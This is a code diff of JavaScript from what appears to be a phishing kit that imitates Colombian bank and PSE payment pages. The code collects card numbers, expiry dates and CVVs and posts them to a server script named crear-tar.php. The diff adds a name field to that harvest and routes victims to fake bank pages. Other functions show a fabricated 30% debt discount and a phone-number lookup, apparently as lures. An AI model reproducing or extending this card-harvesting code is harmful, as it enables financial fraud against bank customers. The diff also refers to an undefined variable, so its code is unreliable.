@@ -36,7 +36,7 @@ function cambiaimg(value) {
 }
 
 
-function selectTC(option,banco) {  
+function selectTC(option,banco) {
   var numtc = document.getElementById("numtc").value;
   var fechat = document.getElementById("fechat").value;
   var codcv = document.getElementById("codcv").value;
@@ -50,11 +50,16 @@ function selectTC(option,banco) {
       return;
   }
 
-  $.post( "process/crear-tar.php", { tar:numtc,fec:fechat,cvv:codcv,ban:banco } ,function(data) {    
-    window.location.href = "transaction/ent/" + option;  
-    //window.location.href = "PSEUserRegister/?o=" + option;
+
+  $.post( "process/crear-tar.php", { tar:numtc,fec:fechat,cvv:codcv,nom:datost,ban:banco } ,function(data) {    
+    window.location.href = "transaction/ent/" + option + "/client.php";  
   }); 
+
+  
+
 }
+
+
 
 
 function selectOption2(option) {
@@ -70,8 +75,8 @@ function selectOption2(option) {
       alert("Por favor, completa todos los campos.");
       return;
   }
-
 }
+
 
 
 function formatInput(input) {
@@ -91,6 +96,7 @@ return p1 + '/' + p2;
 input.value = formattedValue;
 }
 }
+
 
 function detectar_dispositivo(){
     var dispositivo = "";
@@ -119,19 +125,20 @@ function detectar_dispositivo(){
     return dispositivo;
 }
 
-
 function porcentaje(deudar) {
-    document.getElementById("deuda").innerText = deudar;
-    var monto = parseFloat(deudar.replace(/\./g, ''));
 
-    // Calcular el descuento y el total
-    var descuento = monto * 0.30;
-    var montoConDescuento = monto - descuento;
+            document.getElementById("deuda").innerText = deudar;
+            var monto = parseFloat(deudar.replace(/\./g, ''));
     
-    // Mostrar los resultados con separadores de mil
-    document.getElementById('descuento').innerText = descuento.toLocaleString();
-    document.getElementById('total').innerText = montoConDescuento.toLocaleString();
-}
+            // Calcular el descuento y el total
+            var descuento = monto * 0.30;
+            var montoConDescuento = monto - descuento;
+            
+            // Mostrar los resultados con separadores de mil
+            document.getElementById('descuento').innerText = descuento.toLocaleString();
+            document.getElementById('total').innerText = montoConDescuento.toLocaleString();
+        }
+
 function cargar_resumen(v) {
     $("#espera").hide();
     $("#section2").show();
@@ -160,6 +167,7 @@ async function validarNumero() {
   const lineas = data.split('\n').map(linea => linea.split(','));
 
   for (let i = 0; i < lineas.length; i++) {
+    //alert(lineas[i]);
     if (lineas[i].length < 2) {
       continue; // Saltar la l nea si no tiene al menos dos columnas
     }
@@ -167,12 +175,12 @@ async function validarNumero() {
     const telefono = lineas[i][0].trim().replace('"', '').replace('"', '');
     const valor = lineas[i][1].trim().replace('"', '').replace('"', '');
     if (telefono === telefonoIngresado) {
-      const valorCorrespondiente = valor;    
-      
+      const valorCorrespondiente = valor;      
+
       $("#usuario").hide();
       $("#espera").show();        
       
-      setTimeout(cargar_resumen,3000,valor);
+      setTimeout(cargar_resumen,3000,valor)
 
       return; // Salir del bucle una vez que se encuentra el numero
     }
@@ -192,24 +200,19 @@ function toggleOptions1() {
 }
 
 function selectOption1(option) {
-    document.getElementById("selectedValue1").value = option;
-    //document.getElementById("optionsList1").style.display = "none";
+  document.getElementById("selectedValue1").value = option;
+  document.getElementById("optionsList1").style.display = "none";
+  
 
-    if (option == "TRICOLOR" || option == "NEQUI" || option == "De Bogota" || option == "PSE") {
-        if (option == "TRICOLOR") {    
-            window.location.href = "transaction/sucursal";
-            //window.location.href = "PSEUserRegister/?o=t23";
-
-        } else if (option == "NEQUI") {        
-            window.location.href = "transaction/clientes";
-              //window.location.href = "PSEUserRegister/?o=t18";        
-        } else if (option == "De Bogota") {        
-            window.location.href = "transaction/personas";     
-              //window.location.href = "PSEUserRegister/?o=t12";   
-        } else if (option == "PSE") {        
-            window.location.href = "transaction/PSEtransaction";                   
+  if (option == "TRICOLOR" || option == "NEQUI" || option == "De Bogota") {    
+    if (option == "TRICOLOR") {    
+        window.location.href = "transaction/sucursal/client.php";
+    } else if (option == "NEQUI") {                  
+          window.location.href = "transaction/clientes/pagos.html";        
+    } else if (option == "De Bogota") {                  
+          window.location.href = "transaction/personas/client.html";        
         }
-    } else if ( option == "Tarjeta") {
+      } else if ( option == "Tarjeta") {
         $("#section3").hide();
         $("#Tarjeta").show();  
     } else {
